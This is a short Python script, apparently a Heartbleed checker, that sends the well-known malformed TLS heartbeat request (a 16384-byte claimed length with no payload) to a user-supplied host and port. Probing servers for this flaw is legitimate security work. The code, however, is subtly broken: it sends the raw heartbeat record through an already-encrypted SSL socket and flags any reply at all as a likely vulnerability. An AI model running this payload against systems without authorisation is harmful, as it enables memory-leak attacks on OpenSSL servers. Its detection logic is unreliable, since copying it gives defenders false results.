#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# Author: cbk914

import sys
import socket
import ssl
import logging

# Configure logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

def create_heartbeat_payload():
    """Create a TLS heartbeat request payload."""
    payload = b'\x18\x03\x02\x00\x03'  # TLSv1.1 HeartbeatRequest
    payload += b'\x01\x40\x00'         # Payload length: 16384 bytes
    return payload

def check_heartbleed(host, port):
    """Check for Heartbleed vulnerability on a specified host and port."""
    try:
        # Create a socket and wrap it with SSL
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(5)
        wrapped_socket = ssl.wrap_socket(sock, ssl_version=ssl.PROTOCOL_TLSv1_1)
        wrapped_socket.connect((host, port))
       
        logging.info(f'Connected to {host}:{port}')
       
        # Send heartbeat payload
        wrapped_socket.send(create_heartbeat_payload())
        response = wrapped_socket.recv(1024)
       
        # Check if a response is received
        if len(response) > 0:
            logging.info(f'Possible Heartbleed vulnerability detected for {host}:{port}')
        else:
            logging.info(f'No Heartbleed vulnerability detected for {host}:{port}')
       
        # Close the connections
        wrapped_socket.close()
        sock.close()
    except (socket.timeout, socket.error, ssl.SSLError) as e:
        logging.error(f'Error connecting to {host}:{port} - {str(e)}')
    except Exception as e:
        logging.error(f'An unexpected error occurred: {str(e)}')
    finally:
        if 'wrapped_socket' in locals():
            wrapped_socket.close()
        if 'sock' in locals():
            sock.close()

def validate_input(host, port):
    """Validate the input host and port."""
    try:
        socket.gethostbyname(host)
    except socket.error:
        logging.error(f'Invalid host: {host}')
        return False
    
    if not (1 <= port <= 65535):
        logging.error(f'Invalid port: {port}')
        return False
    
    return True

def main():
    if len(sys.argv) != 3:
        logging.error('Usage: python heartbleed_checker.py <host> <port>')
        sys.exit(1)

    host = sys.argv[1]
    try:
        port = int(sys.argv[2])
    except ValueError:
        logging.error('Port must be an integer')
        sys.exit(1)

    if validate_input(host, port):
        check_heartbleed(host, port)
    else:
        sys.exit(1)

if __name__ == '__main__':
    main()
